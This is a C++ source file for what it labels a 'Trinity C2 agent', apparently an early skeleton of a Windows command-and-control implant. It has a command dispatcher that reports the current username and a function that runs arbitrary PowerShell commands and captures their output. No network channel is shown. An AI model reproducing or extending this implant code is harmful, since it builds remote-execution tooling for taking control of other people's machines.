//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { START OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
#include "Agent.h"
#include "InputIntentRecorder.h"

void Agent::Exit()
{
    // Exit agent process
    ExitProcess(0);
}

std::string Agent::GetUID()
{
    char username[256];
    DWORD username_len = sizeof(username);
    // Get the username of the current user
    if (GetUserNameA(username, &username_len))
    {
        return std::string(username);
    }

    return std::string();
}

std::string Agent::ExecuteCommand(int commandType)
{
    switch (commandType)
    {
    case 0x0017:
        return GetUID();
    default:
        return std::string();
    }
}

std::string Agent::ExecutePowerShell(const std::string &command)
{
#ifdef _WIN32
    // Execute PowerShell command and return the output
    std::string result;
    std::string psCommand = "powershell.exe -Command \"" + command + "\"";
    FILE *pipe = _popen(psCommand.c_str(), "r");
    if (!pipe)
    {
        return "Error executing PowerShell command.";
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result += buffer;
    }

    _pclose(pipe);
    return result;
#else
    (void)command; // Suppress unused parameter warning
    return "PowerShell execution is only supported on Windows.";
#endif
}

void Agent::Init()
{
    // Initialize agent
    user = GetUID();
}

std::string Agent::GetUser() const
{
    return user;
}

int main(int argc, char *argv[])
{
    MessageBoxA(NULL, "Trinity C2 agent", ";)", MB_OK);

    Agent agent;
    agent.Init();

    return 0;
}

//  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ { END OF FILE } ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ //
